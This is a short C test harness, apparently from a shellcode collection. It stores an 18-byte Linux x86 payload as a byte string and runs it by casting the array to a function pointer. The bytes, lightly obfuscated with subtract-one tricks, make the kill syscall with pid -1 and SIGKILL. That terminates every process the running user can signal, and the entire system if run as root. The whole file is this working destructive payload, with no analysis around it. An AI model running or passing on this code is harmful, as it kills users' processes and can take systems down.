	#include<stdio.h>
	#include<string.h>

	unsigned char code[] = "\x6a\x26\x58\x83\xe8\x01\x31\xdb\xf7\xd3\x6a\x0a\x59\x83\xe9\x01\xcd\x80";

	main()
	{
	  printf("Shellcode Length: %d\n", strlen(code));

	  int (*ret)() = (int(*)())code;

	  ret();
	}
